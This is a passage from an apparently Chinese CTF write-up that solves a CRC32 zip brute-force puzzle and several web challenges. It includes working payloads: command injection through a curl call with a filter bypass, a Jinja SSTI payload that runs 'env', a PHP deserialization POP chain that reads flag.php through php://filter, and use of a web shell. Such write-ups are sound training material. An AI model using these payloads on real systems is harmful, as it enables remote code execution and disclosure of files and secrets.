class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>最后进行三字节爆破得到内容</p><pre class="line-numbers language-highlight python"><span class="keyword"><code class="language-highlight python"><span class="keyword">import</span> zlibcrc_list = [<span class="number">0xd2b184ff</span>,<span class="number">0xb462df74</span>,<span class="number">0x32973a9e</span>,<span class="number">0x80a37b94</span>,<span class="number">0x67ff2f5b</span>,<span class="number">0xd2b184ff</span>,<span class="number">0xb462df74</span>,<span class="number">0x32973a9e</span>,<span class="number">0x2bd745ce</span>,<span class="number">0xd2b184ff</span>,<span class="number">0xb462df74</span>,<span class="number">0x32973a9e</span>,<span class="number">0x8011b198</span>,<span class="number">0xd2b184ff</span>,<span class="number">0xb462df74</span>,<span class="number">0x32973a9e</span>,<span class="number">0xca923eba</span>,<span class="number">0xd2b184ff</span>,<span class="number">0xb462df74</span>,<span class="number">0x32973a9e</span>,<span class="number">0x671c3b57</span>,<span class="number">0xd2b184ff</span>,<span class="number">0xb462df74</span>,<span class="number">0x32973a9e</span>,<span class="number">0x2bd745ce</span>,<span class="number">0xd2b184ff</span>,<span class="number">0xb462df74</span>,<span class="number">0x32973a9e</span>,<span class="number">0x671c3b57</span>,<span class="number">0xd2b184ff</span>,<span class="number">0xb462df74</span>,<span class="number">0x32973a9e</span>,<span class="number">0xbae88946</span>,<span class="number">0x8d05071e</span>,<span class="number">0x44454e88</span>,<span class="number">0xd2b184ff</span>,<span class="number">0xb462df74</span>,<span class="number">0x32973a9e</span>,<span class="number">0x3556ac70</span>,<span class="number">0xd2b184ff</span>,<span class="number">0xb462df74</span>,<span class="number">0x32973a9e</span>,<span class="number">0xca923eba</span>,<span class="number">0xd2b184ff</span>,<span class="number">0xb462df74</span>,<span class="number">0x32973a9e</span>,<span class="number">0xf1a75063</span>,<span class="number">0x8ad3bf47</span>,<span class="number">0xe71302b2</span>,<span class="number">0xd2b184ff</span>,<span class="number">0xb462df74</span>,<span class="number">0x32973a9e</span>,<span class="number">0xb10371d</span>,<span class="number">0xffcef5e5</span>,<span class="number">0x3556ac70</span>,<span class="number">0xd2b184ff</span>,<span class="number">0xb462df74</span>,<span class="number">0x32973a9e</span>,<span class="number">0x385b0871</span>,<span class="number">0x44454e88</span>,<span class="number">0xe9c57755</span>,<span class="number">0x67ff2f5b</span>,<span class="number">0xd2b184ff</span>,<span class="number">0xb462df74</span>,<span class="number">0x32973a9e</span>,<span class="number">0x987a20e2</span>,<span class="number">0xd2b184ff</span>,<span class="number">0xb462df74</span>,<span class="number">0x32973a9e</span>,<span class="number">0x80a37b94</span>,<span class="number">0xd2b184ff</span>,<span class="number">0xb462df74</span>,<span class="number">0x32973a9e</span>,<span class="number">0x987a20e2</span>,<span class="number">0xd2b184ff</span>,<span class="number">0xb462df74</span>,<span class="number">0x32973a9e</span>,<span class="number">0xca923eba</span>,<span class="number">0xd2b184ff</span>,<span class="number">0xb462df74</span>,<span class="number">0x32973a9e</span>,<span class="number">0x3556ac70</span>,<span class="number">0xd2b184ff</span>,<span class="number">0xb462df74</span>,<span class="number">0x32973a9e</span>,<span class="number">0xca923eba</span>,<span class="number">0xd2b184ff</span>,<span class="number">0xb462df74</span>,<span class="number">0x32973a9e</span>,<span class="number">0xf1a75063</span>,<span class="number">0xd2b184ff</span>,<span class="number">0xb462df74</span>,<span class="number">0x32973a9e</span>,<span class="number">0xf1a75063</span>,<span class="number">0x67ff2f5b</span>,<span class="number">0xd2b184ff</span>,<span class="number">0xb462df74</span>,<span class="number">0x32973a9e</span>,<span class="number">0xb10371d</span>,<span class="number">0x35a296cb</span>,<span class="number">0xd2b184ff</span>,<span class="number">0xb462df74</span>,<span class="number">0x32973a9e</span>,<span class="number">0xffcef5e5</span>,<span class="number">0xbae88946</span>,<span class="number">0xd2b184ff</span>,<span class="number">0xb462df74</span>,<span class="number">0x32973a9e</span>,<span class="number">0xffcef5e5</span>,<span class="number">0xd2b184ff</span>,<span class="number">0xb462df74</span>,<span class="number">0x32973a9e</span>,<span class="number">0x671c3b57</span>,<span class="number">0x961e78b1</span>,<span class="number">0xd2b184ff</span>,<span class="number">0xb462df74</span>,<span class="number">0x32973a9e</span>,<span class="number">0x987a20e2</span>,<span class="number">0xd2b184ff</span>,<span class="number">0xb462df74</span>,<span class="number">0x32973a9e</span>,<span class="number">0xbae88946</span>,<span class="number">0xd2b184ff</span>,<span class="number">0xb462df74</span>,<span class="number">0x32973a9e</span>,<span class="number">0x987a20e2</span>,<span class="number">0x44454e88</span>,<span class="number">0xd2b184ff</span>,<span class="number">0xb462df74</span>,<span class="number">0x32973a9e</span>,<span class="number">0xffcef5e5</span>,<span class="number">0xd2b184ff</span>,<span class="number">0xb462df74</span>,<span class="number">0x32973a9e</span>,<span class="number">0x385b0871</span>,<span class="number">0xd2b184ff</span>,<span class="number">0xb462df74</span>,<span class="number">0x32973a9e</span>,<span class="number">0xacb845e7</span>,<span class="number">0xb10371d</span>,<span class="number">0x55de84d6</span>,<span class="number">0xd2b184ff</span>,<span class="number">0xb462df74</span>,<span class="number">0x32973a9e</span>,<span class="number">0xbae88946</span>,<span class="number">0xffcef5e5</span>,<span class="number">0x3556ac70</span>,<span class="number">0xd2b184ff</span>,<span class="number">0xb462df74</span>,<span class="number">0x32973a9e</span>,<span class="number">0x671c3b57</span>,<span class="number">0x44454e88</span>,<span class="number">0xd2b184ff</span>,<span class="number">0xb462df74</span>,<span class="number">0x32973a9e</span>,<span class="number">0xf1a75063</span>,<span class="number">0x8ad3bf47</span>,<span class="number">0xd2b184ff</span>,<span class="number">0xb462df74</span>,<span class="number">0x32973a9e</span>,<span class="number">0xf1a75063</span>,<span class="number">0x5133df38</span>,<span class="number">0x76ccfc6b</span>,<span class="number">0x961e78b1</span>,<span class="number">0xd2b184ff</span>,<span class="number">0xb462df74</span>,<span class="number">0x32973a9e</span>,<span class="number">0x8011b198</span>,<span class="number">0xd2b184ff</span>,<span class="number">0xb462df74</span>,<span class="number">0x32973a9e</span>,<span class="number">0x385b0871</span>,<span class="number">0xe9c57755</span>,<span class="number">0xd2b184ff</span>,<span class="number">0xb462df74</span>,<span class="number">0x32973a9e</span>,<span class="number">0x80a37b94</span>,<span class="number">0xbae88946</span>,<span class="number">0xd2b184ff</span>,<span class="number">0xb462df74</span>,<span class="number">0x32973a9e</span>,<span class="number">0xb10371d</span>,<span class="number">0xe9c57755</span>,<span class="number">0x44454e88</span>,<span class="number">0xd2b184ff</span>,<span class="number">0xb462df74</span>,<span class="number">0x32973a9e</span>,<span class="number">0xacb845e7</span>,<span class="number">0x5133df38</span>,<span class="number">0x35a296cb</span>,<span class="number">0x8ad3bf47</span>,<span class="number">0xd2b184ff</span>,<span class="number">0xb462df74</span>,<span class="number">0x32973a9e</span>,<span class="number">0xf9cd093c</span>,<span class="number">0xd2b184ff</span>,<span class="number">0xb462df74</span>,<span class="number">0x32973a9e</span>,<span class="number">0xca923eba</span>,<span class="number">0xd2b184ff</span>,<span class="number">0xb462df74</span>,<span class="number">0x32973a9e</span>,<span class="number">0xb10371d</span>,<span class="number">0xd2b184ff</span>,<span class="number">0xb462df74</span>,<span class="number">0x32973a9e</span>,<span class="number">0x385b0871</span>,<span class="number">0xffcef5e5</span>,<span class="number">0xd2b184ff</span>,<span class="number">0xb462df74</span>,<span class="number">0x32973a9e</span>,<span class="number">0x80a37b94</span>,<span class="number">0xd2b184ff</span>,<span class="number">0xb462df74</span>,<span class="number">0x32973a9e</span>,<span class="number">0xb10371d</span>,<span class="number">0xe9c57755</span>,<span class="number">0xef809c83</span>]<span class="comment"># 遍历所有可能的3字节数据</span><span class="keyword">for</span> target_crc <span class="keyword">in</span> crc_list:    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):            <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):                data = <span class="built_in">bytes</span>([i, j, k])  <span class="comment"># 构造3字节数据</span>                crc = zlib.crc32(data) & <span class="number">0xffffffff</span>  <span class="comment"># 计算CRC32值</span>                <span class="keyword">if</span> crc == target_crc:                    data=data.decode()                    <span class="built_in">print</span>(<span class="string">f"Found matching data: <span class="subst">{data}</span>"</span>)                    <span class="keyword">break</span><span class="built_in">print</span>(<span class="string">"Finished searching."</span>)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301749963.png"></p><p>爆破脚本来自该位大佬博客<a href="https://blog.csdn.net/mochu7777777/article/details/110206427">浅谈使用Python脚本爆破CRC32_crc32.py-CSDN博客</a></p><p>总结得到的信息如下图</p><pre class="line-numbers language-highlight plaintext"><code class="language-highlight plaintext">大写的乌壹大写的资大写的喔大写的日大写的佛大写的资大写的佛大写的巫基得大写的坡大写的日大写的鹅伍思大写的特摸坡大写的迂得零壹大写的希大写的乌大写的希大写的日大写的坡大写的日大写的鹅大写的鹅壹大写的特科大写的摸巫大写的摸大写的佛勒大写的希大写的巫大写的希得大写的摸大写的迂大写的哥特肆大写的巫摸坡大写的佛得大写的鹅伍大写的鹅啊叁勒大写的喔大写的迂零大写的乌巫大写的特零得大写的哥啊科伍大写的喝大写的日大写的特大写的迂摸大写的乌大写的特零玖<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>结合官方给的提示，<a href="https://www.xuezimu.com.cn/info/26zimu.php">https://www.xuezimu.com.cn/info/26zimu.php</a></p><p>可以获得一串base64代码</p><pre class="line-numbers language-highlight plaintext"><code class="language-highlight plaintext">U1ZORFZFWjdPRE5sTmpVd01XWXRPREE1TkMwMFlXWXdMVGt4WmpFdE5Ea3lOV0UwT0dGak5HRTVmUT09<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>base64解密俩次获得flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301757384.png"></p><h4 id="第二种方法"><a href="#第二种方法" class="headerlink" title="第二种方法"></a>第二种方法</h4><p>第二种方法更快，用一个大佬的代码直接跑压缩包就得到结果了</p><pre class="line-numbers language-highlight python"><span class="keyword"><code class="language-highlight python"><span class="keyword">import</span> zipfile<span class="keyword">import</span> binascii<span class="keyword">import</span> string<span class="keyword">from</span> tqdm <span class="keyword">import</span> tqdmfname_fcrc = {}fcrc_fnames = {}fcrc_value = {}archive = zipfile.ZipFile(<span class="string">r"C:\Users\HXY\Desktop\flag.zip"</span>)<span class="built_in">print</span>(<span class="string">&#x27;正在提取crc：&#x27;</span>)<span class="keyword">for</span> fname <span class="keyword">in</span> tqdm(archive.namelist()):    name_info = archive.getinfo(fname)    fcrc = name_info.CRC    fname_fcrc[fname] = fcrc    fcrc_fnames[fcrc] = []<span class="keyword">for</span> fname <span class="keyword">in</span> fname_fcrc:    fcrc = fname_fcrc[fname]    fcrc_fnames[fcrc].append(fname)<span class="built_in">print</span>(<span class="string">&#x27;正在破解3字节长crc&#x27;</span>)<span class="keyword">for</span> i <span class="keyword">in</span> tqdm(<span class="built_in">range</span>(<span class="number">0</span>, <span class="number">256</span>)):    tempi = <span class="built_in">hex</span>(i)[<span class="number">2</span>:]    <span class="keyword">if</span> <span class="built_in">len</span>(tempi) == <span class="number">1</span>:        tempi = <span class="string">&#x27;0&#x27;</span> + tempi    tempi = binascii.a2b_hex(tempi)    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">256</span>):        tempj = <span class="built_in">hex</span>(j)[<span class="number">2</span>:]        <span class="keyword">if</span> <span class="built_in">len</span>(tempj) == <span class="number">1</span>:            tempj = <span class="string">&#x27;0&#x27;</span> + tempj        tempj = binascii.a2b_hex(tempj)        <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">256</span>):            tempk = <span class="built_in">hex</span>(k)[<span class="number">2</span>:]            <span class="keyword">if</span> <span class="built_in">len</span>(tempk) == <span class="number">1</span>:                tempk = <span class="string">&#x27;0&#x27;</span> + tempk            tempk = binascii.a2b_hex(tempk)            fcrc = binascii.crc32(tempi + tempj + tempk)            <span class="keyword">if</span> fcrc <span class="keyword">in</span> fcrc_fnames:                fcrc_value[fcrc] = tempi + tempj + tempk<span class="built_in">print</span>(<span class="string">f&#x27;总crc个数：<span class="subst">{<span class="built_in">len</span>(fcrc_fnames)}</span>，破解成功个数：<span class="subst">{<span class="built_in">len</span>(fcrc_value)}</span>&#x27;</span>)result = {}<span class="built_in">print</span>(<span class="string">&#x27;正在将结果编码：&#x27;</span>)<span class="keyword">for</span> fcrc <span class="keyword">in</span> tqdm(fcrc_value):    <span class="keyword">for</span> fname <span class="keyword">in</span> fcrc_fnames[fcrc]:        result[fname] = fcrc_value[fcrc].decode()<span class="built_in">print</span>(<span class="string">&#x27;编码结果：&#x27;</span>)<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(result)):    <span class="built_in">print</span>(result[<span class="string">f&#x27;<span class="subst">{i}</span>.txt&#x27;</span>], end=<span class="string">&#x27;&#x27;</span>)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301758327.png"></p><p>相比第一种方法，快的不是一星半点</p><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="webinclude"><a href="#webinclude" class="headerlink" title="webinclude"></a>webinclude</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301812056.png"></p><p>还有个flag.php的空文件</p><p>dirsearch坏了，体谅一下，下面是index.bak的源码</p><pre class="line-numbers language-highlight json"> function string_to_int_array(str)<span class="punctuation"><code class="language-highlight json"> function string_to_int_array(str)<span class="punctuation">{</span>        const intArr = <span class="punctuation">[</span><span class="punctuation">]</span>;        for(let i=<span class="number">0</span>;i<str.length;i++)<span class="punctuation">{</span>          const charcode = str.charCodeAt(i);          const partA = Math.floor(charcode / <span class="number">26</span>);          const partB = charcode % <span class="number">26</span>;          intArr.push(partA);          intArr.push(partB);        <span class="punctuation">}</span>        return intArr;      <span class="punctuation">}</span>      function int_array_to_text(int_array)<span class="punctuation">{</span>        let txt = &#x27;&#x27;;        for(let i=<span class="number">0</span>;i<int_array.length;i++)<span class="punctuation">{</span>          txt += String.fromCharCode(<span class="number">97</span> + int_array<span class="punctuation">[</span>i<span class="punctuation">]</span>);        <span class="punctuation">}</span>        return txt;      <span class="punctuation">}</span>const hash = int_array_to_text(string_to_int_array(int_array_to_text(string_to_int_array(parameter))));if(hash === &#x27;dxdydxdudxdtdxeadxekdxea&#x27;)<span class="punctuation">{</span>            window.location = &#x27;flag.html&#x27;;          <span class="punctuation">}</span>else <span class="punctuation">{</span>            document.getElementById(&#x27;fail&#x27;).style.display = &#x27;&#x27;;          <span class="punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>根据上述代码以及题我们可以得知本题不知晓参数，可以通过该代码逆向求解得到parameter</p><p>从而得到flag</p><pre class="line-numbers language-highlight json"><code class="language-highlight json">const hash = &#x27;dxdydxdudxdtdxeadxekdxea&#x27;;function string_to_int_array(str) <span class="punctuation">{</span>    const intArr = <span class="punctuation">[</span><span class="punctuation">]</span>;    for (let i = <span class="number">0</span>; i < str.length; i++) <span class="punctuation">{</span>        intArr.push(str.charCodeAt(i) - <span class="number">97</span>);    <span class="punctuation">}</span>    return intArr;<span class="punctuation">}</span>function int_array_to_string(int_array) <span class="punctuation">{</span>    let str = &#x27;&#x27;;    for (let i = <span class="number">0</span>; i < int_array.length; i += <span class="number">2</span>) <span class="punctuation">{</span>        const charcode = int_array<span class="punctuation">[</span>i<span class="punctuation">]</span> * <span class="number">26</span> + int_array<span class="punctuation">[</span>i + <span class="number">1</span><span class="punctuation">]</span>;        str += String.fromCharCode(charcode);    <span class="punctuation">}</span>    return str;<span class="punctuation">}</span>console.log(int_array_to_string(string_to_int_array(int_array_to_string(string_to_int_array(hash)))));<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p> <img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301825901.png"></p><p>得到参数为   <strong>mihoyo</strong> 然后直接php伪协议读取flag.php得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301827353.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301827606.png"></p><h3 id="fuzz"><a href="#fuzz" class="headerlink" title="fuzz!"></a>fuzz!</h3><pre class="line-numbers language-highlight php"><span class="meta"><code class="language-highlight php"><span class="meta"><?php</span><span class="comment">/*</span><span class="comment">Read /flaggggggg.txt</span><span class="comment">Hint: 你需要学会fuzz，看着键盘一个一个对是没有灵魂的</span><span class="comment">知识补充：curl命令也可以用来读取文件哦，如curl file:///etc/passwd</span><span class="comment">*/</span><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);<span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);<span class="variable">$file</span> = <span class="string">&#x27;file:///etc/passwd&#x27;</span>;<span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">"/\`|\~|\!|\@|\#|\\$|\%|\^|\&|\*|\(|\)|\_|\+|\=|\\\\|\&#x27;|\"|\;|\<|\>|\,|\?|jay/i"</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])){  <span class="keyword">die</span>(<span class="string">&#x27;你需要fuzz一下哦~&#x27;</span>);}<span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">"/fi|le|flag/i"</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])){  <span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>];}<span class="title function_ invoke__">system</span>(<span class="string">&#x27;curl &#x27;</span>.<span class="variable">$file</span>);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>一共有俩个过滤，第一个匹配过滤 ‘file’ 参数的值中是否包含一些特定的字符。这些字符包括**&#96; \ ~ ! @ # $ % ^ &amp; * ( ) _ + &#x3D; \ ‘ “ ; &lt; &gt; , ?** 以及字母序列 “<strong>jay</strong>“，不区分大小写（i标志）。如果匹配上就触发die函数</p><p>第二个过滤如果 ‘file’ 参数的值不匹配上述正则表达式，即不包含 “fi”、”le” 或 “flag”，则执行接下来的代码块。</p><p>先通过一个fuzz测试来看看我们还有哪些字符可用</p><pre class="line-numbers language-highlight php"><span class="meta"><code class="language-highlight php"><span class="meta"><?php</span><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">32</span>; <span class="variable">$i</span> < <span class="number">127</span>; <span class="variable">$i</span>++) {    <span class="comment">// 使用正则表达式检查过滤字符</span>    <span class="variable">$char</span> = <span class="title function_ invoke__">chr</span>(<span class="variable">$i</span>);    <span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">"/[`~!@#\$%\^&*\(\)_\+=\\\&#x27;\";<>,\?]|jay/i"</span>, <span class="variable">$char</span>)) {        <span class="keyword">echo</span> <span class="variable">$char</span>;    }}<span class="meta">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p> -.&#x2F;0123456789:ABCDEFGHIJKLMNOPQRSTUVWXYZ[]abcdefghijklmnopqrstuvwxyz{|}</p></blockquote><p>发现除去数字和字母就**空格-.&#x2F;[]|{|}**可用了</p><p>所以我们可以构造**url+?file&#x3D;|ls &#x2F;**先看看是否有回显</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301935794.png"></p><p>在构造<strong>url+?file&#x3D;|cat &#x2F;fl[a]ggggggg.txt</strong></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301938128.png"></p><p>那么构造**?file&#x3D;|cat &#x2F;fl[a]g**   从而得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301937382.png"></p><p>当时由于课程问题没写，现在我也不知道哪个是对的flag</p><p>至于[]，则是在 Unix&#x2F;Linux 系统的命令行中，方括号 <code>[]</code> 通常用于表示字符范围。我这里直接使其范围为[a]了，一般也可以[a-z]也是能得到正确flag</p><h3 id="恐怖G7人"><a href="#恐怖G7人" class="headerlink" title="恐怖G7人"></a>恐怖G7人</h3><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301946995.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311301946412.png"></p><p>发现回显为2，说明可以ssti注入</p><pre class="line-numbers language-highlight plaintext"><code class="language-highlight plaintext">&#123&#123cycler.__init__.__globals__.os.popen(&#x27;env&#x27;).read()&#125&#125<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>查看当前环境变量得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311302006231.png"></p><h3 id="圣杯战争"><a href="#圣杯战争" class="headerlink" title="圣杯战争!!!"></a>圣杯战争!!!</h3><pre class="line-numbers language-highlight php"><span class="meta"><code class="language-highlight php"><span class="meta"><?php</span><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);<span class="class"><span class="keyword">class</span> <span class="title">artifact</span></span>{  <span class="keyword">public</span> <span class="variable">$excalibuer</span>;  <span class="keyword">public</span> <span class="variable">$arrow</span>;  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>{    <span class="keyword">echo</span> <span class="string">"为Saber选择了对的武器!<br>"</span>;    <span class="keyword">return</span> <span class="variable language_">$this</span>->excalibuer->arrow;  }}<span class="class"><span class="keyword">class</span> <span class="title">prepare</span></span>{  <span class="keyword">public</span> <span class="variable">$release</span>;  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>{    <span class="variable">$functioin</span> = <span class="variable language_">$this</span>->release;    <span class="keyword">echo</span> <span class="string">"蓄力!咖喱棒！！<br>"</span>;    <span class="keyword">return</span> <span class="variable">$functioin</span>();  }}<span class="class"><span class="keyword">class</span> <span class="title">saber</span></span>{  <span class="keyword">public</span> <span class="variable">$weapon</span>;  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>{    <span class="keyword">echo</span> <span class="string">"胜利！<br>"</span>;    <span class="keyword">include</span>(<span class="variable language_">$this</span>->weapon);  }}<span class="class"><span class="keyword">class</span> <span class="title">summon</span></span>{  <span class="keyword">public</span> <span class="variable">$Saber</span>;  <span class="keyword">public</span> <span class="variable">$Rider</span>;  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>{    <span class="keyword">echo</span> <span class="string">"开始召唤从者！<br>"</span>;    <span class="keyword">echo</span> <span class="variable language_">$this</span>->Saber;  }}<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;payload&#x27;</span>])){  <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;payload&#x27;</span>]);}<span class="meta">?></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>显而易见，这是一道pop链的题</p><p>pop链的构成为:    summon -&gt; artifact -&gt; prepare -&gt; saber</p><p>所以我们可以写出以下的代码</p><pre class="line-numbers language-highlight php"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__"><code class="language-highlight php"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">summon</span>();<span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">artifact</span>();<span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">prepare</span>();<span class="variable">$d</span> = <span class="keyword">new</span> <span class="title function_ invoke__">saber</span>();<span class="variable">$a</span> -> Saber = <span class="variable">$b</span>;<span class="variable">$b</span> -> excalibuer = <span class="variable">$c</span>;<span class="variable">$c</span> -> release = <span class="variable">$d</span>;<span class="variable">$d</span> -> weapon = <span class="string">"php://filter/read=convert.base64-encode/resource=flag.php"</span>;<span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311302028831.png"></p><p>执行得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311302028656.png"></p><p>base64解密得到flag</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311302026901.png"></p><h3 id="where-is-the-flag"><a href="#where-is-the-flag" class="headerlink" title="where_is_the_flag"></a>where_is_the_flag</h3><p>打开是一句话木马，通过蚁剑可以连接进去</p><p>第一段flag在flag.php里</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311302036029.png"></p><p>第二个flag在根目录里</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311302037752.png"></p><p>第三个flag需要用终端echo出来</p><p>可以从红色文件得知</p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311302037216.png"></p><p><img src="https://dao-1-1317774468.cos.ap-nanjing.myqcloud.com/images/202311302038876.png"></p><p>至此，将三段flag拼接即为正确答案</p><h3 id="绕进你的心里"><a href="#绕进你的心里" class="headerlink" title="绕进你的心里"></a>绕进你的心里</h3><pre class="line-numbers language-highlight php"><span class="meta"><code class="language-highlight php"><span class="meta"><?php</span><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);<span class="keyword">require</span> <span class="string">&#x27;flag.php&#x27;</span>;<span class="variable">$str</span> = (String)<span class="variable">$_POST</span>[<span class="string">&#x27;pan_gu&#x27;</span>];<span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;zhurong&#x27;</span>];<span class="variable">$lida1</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;hongmeng&#x27;</span>];<span class="variable">$lida2</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;shennong&#x27;</span>];<span class="keyword">if</span>(<span class="variable">$lida1</span> !== <span class="variable">$lida2</span> && <span class="title function_ invoke__">md5</span>(<span class="variable">$lida1</span>) === <span class="title function_ invoke__">md5</span>(<span class="variable">$lida2</span>)){  <span class="keyword">echo</span> <span class="string">"md5绕过了!"</span>;  <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">"/[0-9]/"</span>, <span class="variable">$num</span>)){    <span class="keyword">die</span>(<span class="string">&#x27;你干嘛?哎哟!&#x27;</span>);  }  <span class="keyword">elseif</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>)){    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/.+?ISCTF/is&#x27;</span>, <span class="variable">$str</span>)){      <span class="keyword">die</span>(<span 